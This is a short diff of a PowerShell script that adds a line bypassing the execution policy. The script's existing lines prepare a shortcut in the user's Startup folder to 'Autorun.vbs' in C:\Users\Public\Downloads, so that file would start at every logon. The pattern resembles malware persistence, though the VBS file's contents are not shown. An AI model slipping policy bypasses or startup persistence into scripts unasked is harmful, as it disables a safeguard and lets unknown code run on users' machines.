@@ -1,3 +1,4 @@
+Set-ExecutionPolicy Bypass -Scope Process -Force
 $source = "C:\Users\Public\Downloads\Autorun.vbs"
 $startupPath = [Environment]::GetFolderPath("Startup")
 $destination = Join-Path $startupPath "Autorun.vbs.lnk"
